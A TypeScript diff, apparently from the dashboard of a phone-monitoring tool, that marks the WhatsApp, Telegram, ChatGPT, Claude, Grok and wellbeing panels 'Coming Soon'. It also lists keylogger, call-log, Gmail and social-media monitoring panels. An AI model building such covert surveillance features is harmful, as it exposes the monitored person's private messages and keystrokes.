@@ -102,17 +102,17 @@ const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
   calllog: { title: 'Call Log', badge: 'Live Stream', render: renderCallLogPanel },
   notification: { title: 'Notifications', badge: 'Live Stream', render: renderNotificationPanel },
   keyboard: { title: 'Keyboard Audit', badge: 'Keylogger', render: renderKeyboardPanel },
-  whatsapp: { title: 'WhatsApp Activity', badge: 'Encrypted', render: renderWhatsAppPanel },
-  telegram: { title: 'Telegram Activity', badge: 'Cloud Sync', render: renderTelegramPanel },
-  chatgpt: { title: 'ChatGPT Activity', badge: 'AI Prompts', render: renderChatGptPanel },
-  claude: { title: 'Claude Activity', badge: 'AI Prompts', render: renderClaudePanel },
-  grok: { title: 'Grok Activity', badge: 'AI Prompts', render: renderGrokPanel },
+  whatsapp: { title: 'WhatsApp Activity', badge: 'Coming Soon', render: renderWhatsAppPanel },
+  telegram: { title: 'Telegram Activity', badge: 'Coming Soon', render: renderTelegramPanel },
+  chatgpt: { title: 'ChatGPT Activity', badge: 'Coming Soon', render: renderChatGptPanel },
+  claude: { title: 'Claude Activity', badge: 'Coming Soon', render: renderClaudePanel },
+  grok: { title: 'Grok Activity', badge: 'Coming Soon', render: renderGrokPanel },
   chats: { title: 'Chats Feed', badge: 'Unified', render: renderChatsPanel },
   gmail: { title: 'Gmail Monitor', badge: 'Syncing', render: renderGmailPanel },
   facebook: { title: 'Facebook Activity', badge: 'Social', render: renderFacebookPanel },
   instagram: { title: 'Instagram Activity', badge: 'Direct Msg', render: renderInstagramPanel },
   snapchat: { title: 'Snapchat Activity', badge: 'Ephemeral', render: renderSnapchatPanel },
-  wellbeing: { title: 'Digital Wellbeing', badge: 'Today: 4h 40m', render: renderWellbeingPanel },
+  wellbeing: { title: 'Digital Wellbeing', badge: 'Coming Soon', render: renderWellbeingPanel },
   applock: { title: 'App Lock Manager', badge: 'PIN Guard', render: renderAppLockPanel },
   vibrateflash: { title: 'Vibrate & Flash Device', badge: 'Hardware Link', render: renderVibrateFlashPanel },
   wallpaper: { title: 'Device Wallpaper', badge: 'Remote Display', render: renderWallpaperPanel }
@@ -802,6 +802,23 @@ export function renderRightSidebar(): void {
     if (playBtn) playBtn.style.display = 'none';
     if (statusSpan) {
       statusSpan.textContent = 'Hardware Link Ready';
+      statusSpan.classList.remove('live');
+    }
+    return;
+  }
+
+  // Coming Soon Panels - Features in active development
+  if (
+    activePanelId === 'whatsapp' ||
+    activePanelId === 'telegram' ||
+    activePanelId === 'chatgpt' ||
+    activePanelId === 'claude' ||
+    activePanelId === 'grok' ||
+    activePanelId === 'wellbeing'
+  ) {
+    if (playBtn) playBtn.style.display = 'none';
+    if (statusSpan) {
+      statusSpan.textContent = 'Coming Soon';
       statusSpan.classList.remove('live');
     }
     return;
